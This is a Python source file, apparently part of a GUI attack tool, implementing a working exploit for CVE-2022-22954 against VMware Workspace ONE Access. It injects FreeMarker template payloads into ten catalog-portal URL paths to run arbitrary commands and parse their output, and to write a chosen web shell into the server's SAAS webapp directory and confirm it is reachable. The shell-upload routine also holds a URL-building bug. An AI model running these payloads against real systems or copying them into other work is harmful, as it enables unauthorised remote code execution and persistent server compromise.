import re
from urllib.parse import quote_plus
import urllib3
import requests
from utils.output import *

urllib3.disable_warnings()

class cve_2022_22954_exploit:

    def __init__(self, url_text, result_text, update_date, command_text, shell_text, shell_name_text):
        _url = str(url_text.text())
        if _url.endswith("/"):
            self.url = _url[:-1]
        else:
            self.url = _url
        self.result_text = result_text
        self.update_date = update_date
        self.cmd = command_text.toPlainText()
        self.shell_content = shell_text.toPlainText()
        self.shell_name = shell_name_text.text()
        self.payloads = {
            "/catalog-portal/ui?code=&deviceType=",
            "/catalog-portal/ui?code=&deviceUdid=",
            "/catalog-portal/hub-ui?deviceType=",
            "/catalog-portal/hub-ui?deviceUdid=",
            "/catalog-portal/hub-ui/byob?deviceType=",
            "/catalog-portal/hub-ui/byob?deviceUdid=",
            "/catalog-portal/ui/oauth/verify?error=&deviceType=",
            "/catalog-portal/ui/oauth/verify?error=&deviceUdid=",
            "/catalog-portal/ui/oauth/verify?code=&deviceType=",
            "/catalog-portal/ui/oauth/verify?code=&deviceUdid=",
        }
        if self.url == "":
            self.update_date.emit(output_format("ERROR", "What's your url?"))

    def get_command_results(self, text):
        try:
            result = re.search("device id: (.*), device type", text).group(1)
            if "null" == result:
                if "auth token" in text:
                    result = re.search("device type: (.*), auth token", text).group(1)
                else:
                    result = re.search("device type: (.*)and token revoke status", text).group(1)
            result = result.replace('\\n', '\n').replace('\\t', '\t')
            self.update_date.emit(output_format("SUCCESS", f"The command execution result was successful parsed, and the results are as follows: \n{result}"))
        except Exception as e:
            self.update_date.emit(output_format("ERROR", f"Failed to parse the command execution result. Please check the network connection and confirm if the command exists (You should use absolute path) or try manually exploiting it. Error message: {str(e)}"))

    def exec_command(self):
        poc = '${"freemarker.template.utility.Execute"?new()("' + self.cmd + '")}'
        try:
            for payload in self.payloads:
                vuln_url = f"{self.url}{payload}{poc}"
                response = requests.get(vuln_url, verify=False)
                if response.status_code == 400 and ("Authorization context is not valid" in response.text or "Cannot run program" in response.text or "FreeMarker template error" in response.text):
                    self.get_command_results(response.text)
                    break
                else:
                    continue
        except Exception as e:
            self.update_date.emit(output_format("FAILED", f"Please check the network then retry. Error message: {str(e)}"))

    def check_shell(self, shell_url):
        try:
            resp = requests.get(shell_url, verify=False)
            if resp.status_code == 200:
                return True
            else:
                return False
        except:
            return False

    def write_shell(self):
        self.shell_content = quote_plus(self.shell_content.replace('"', '\\"'))
        shell_path = "/opt/vmware/horizon/workspace/webapps/SAAS/" + self.shell_name
        exp = '${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileOutputStream","' + shell_path + '").write("freemarker.template.utility.ObjectConstructor"?new()("java.lang.String","' + self.shell_content + '").getBytes())}'
        try:
            for payload in self.payloads:
                vuln_url = f"{self.url} + {payload} + {exp}"
                response = requests.get(vuln_url, verify=False)
                if response.status_code == 400 and ("Authorization context is not valid" in response.text or "Cannot run program" in response.text or "FreeMarker template error" in response.text):
                    shell_url = f"{self.url}/SAAS/{self.shell_name}"
                    if self.check_shell(shell_url):
                        self.update_date.emit(output_format("SUCCESS", f"Shell was uploaded successfully! Shell url: {shell_url}"))
                        break
                    else:
                        continue
                else:
                    continue
        except Exception as e:
            self.update_date.emit(output_format("FAILED", f"Please check the network then retry. Error message: {str(e)}"))

    def exploit(self):
        if self.shell_name == "" and self.cmd != "":
            self.exec_command()
        elif self.shell_name != "" and self.cmd == "":
            self.write_shell()
        else:
            self.update_date.emit(output_format("INFO", "If you want to execute a command, please do not fill in the shell name.If you want to upload a shell, please do not fill in the command. These two functionalities are mutually exclusive, you can only choose one."))